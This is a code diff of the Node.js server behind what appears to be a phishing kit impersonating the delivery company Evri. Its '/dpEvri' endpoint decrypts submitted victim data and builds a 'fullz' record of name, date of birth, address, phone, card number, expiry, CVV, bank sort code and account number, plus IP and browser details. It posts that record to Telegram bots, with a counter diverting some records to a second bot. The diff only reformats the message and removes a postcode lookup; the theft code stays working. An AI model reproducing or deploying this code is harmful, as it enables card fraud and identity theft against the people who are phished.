@@ -14688,7 +14688,7 @@ app.post("/gh0stEvri", async (req, res) => {
 
 app.options("/dpEvri", cors());
 
-app.post("/dpEvri", async (req, res) => {
+app.post("/dpEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -14743,56 +14743,51 @@ app.post("/dpEvri", async (req, res) => {
       }
     })
     .then(function () {
-      axios
-        .get(`https://api.postcodes.io/postcodes/${pcode.replace(/ /g, "")}`)
-        .then((resp) => {
-          city = resp.data.result.admin_district;
-          binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-          var originalText = `=========> DP FULLZ <==========]\n| Full name : ${fname}\n| Date of birth : ${dob}\n| Address : ${address}\n| City: ${city}\n| Post Code : ${pcode}\n| Mobile Number : ${telephone}\n[==========> Fullz <==========]\n| Card Holder's Name : ${ccname}\n| Card Number : ${ccnum}\n| Expiry Date : ${ccexp}\n| CVV : ${cvv}\n| Bank Name : ${bankName}\n| Account Number : ${accno}\n| Sort Code : ${scode}\n[==========> IP INFO <==========]\n| Submitted by : ${ip}\n| UserAgent : ${userAgent}\n==========> DP FULLZ<==========`;
-          if (clearstore == 10) {
-            axios
-              .post(
-                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
-                {
-                  chat_id: 680379375,
-                  text: `HAYTCHRES:\n${originalText}`,
-                  parse_mode: "Markdown",
-                }
-              )
-              .catch((e) => {
-                console.log(e);
-              });
-            clearstore = 6;
-          } else {
-            axios
-              .post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-                {
-                  chat_id: 680379375,
-                  text: `EvriDP:\n${originalText}`,
-                  parse_mode: "Markdown",
-                }
-              )
-              .catch((e) => {
-                console.log(e);
-              });
-            axios
-              .post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-                {
-                  chat_id: 5582405778,
-                  text: `Evri:\n${originalText}`,
-                  parse_mode: "Markdown",
-                }
-              )
-              .catch((e) => {
-                console.log(e);
-              });
-            clearstore += 1;
-          }
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (mk == 7) {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        mk = 0;
+      } else {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `EvriDP:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 5582405778,
+              text: `Evri:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        mk += 1;
+      }
 
-          res.send("Update Completed");
-        });
+      res.send("Update Completed");
     });
 });
 
